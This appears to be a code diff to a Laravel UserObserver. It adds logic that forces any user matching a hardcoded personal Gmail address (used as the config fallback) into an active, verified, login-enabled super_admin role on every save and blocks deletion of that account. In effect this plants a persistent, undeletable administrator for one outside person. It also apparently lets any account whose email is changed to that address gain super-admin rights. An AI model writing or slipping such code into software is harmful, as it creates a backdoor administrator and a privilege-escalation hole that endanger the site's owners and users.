@@ -10,6 +10,46 @@ use LogicException;
 
 class UserObserver
 {
+    public function saving(User $user): void
+    {
+        if (!$this->isProtectedSuperAdminAccount($user)) {
+            return;
+        }
+
+        $protectedEmail = $this->protectedSuperAdminEmail();
+
+        $user->email = $protectedEmail;
+        $user->role = 'super_admin';
+
+        if (Schema::hasColumn('users', 'role_id')) {
+            $user->role_id = null;
+        }
+
+        if (Schema::hasColumn('users', 'status')) {
+            $user->status = 'active';
+        }
+
+        if (Schema::hasColumn('users', 'is_verified')) {
+            $user->is_verified = true;
+        }
+
+        if (Schema::hasColumn('users', 'email_verified_at') && empty($user->email_verified_at)) {
+            $user->email_verified_at = now();
+        }
+
+        if (Schema::hasColumn('users', 'verified_at') && empty($user->verified_at)) {
+            $user->verified_at = now();
+        }
+
+        if (Schema::hasColumn('users', 'allow_login')) {
+            $user->allow_login = 1;
+        }
+
+        if (Schema::hasColumn('users', 'is_protected_super_admin')) {
+            $user->is_protected_super_admin = true;
+        }
+    }
+
     /**
      * Handle the User "created" event.
      * This triggers automatically after a user is saved to the database.
@@ -53,8 +93,24 @@ class UserObserver
 
     public function deleting(User $user): void
     {
-        if ($user->isProtectedSuperAdmin()) {
+        if ($this->isProtectedSuperAdminAccount($user)) {
             throw new LogicException('The protected super admin account cannot be deleted.');
         }
+    }
+
+    private function isProtectedSuperAdminAccount(User $user): bool
+    {
+        $protectedEmail = $this->protectedSuperAdminEmail();
+        $currentEmail = strtolower((string) ($user->email ?? ''));
+        $originalEmail = strtolower((string) ($user->getOriginal('email') ?? ''));
+
+        return $currentEmail === $protectedEmail
+            || $originalEmail === $protectedEmail
+            || (bool) ($user->is_protected_super_admin ?? false);
+    }
+
+    private function protectedSuperAdminEmail(): string
+    {
+        return strtolower((string) config('internal.super_admin_email', 'donvictorlive@gmail.com'));
     }
 }
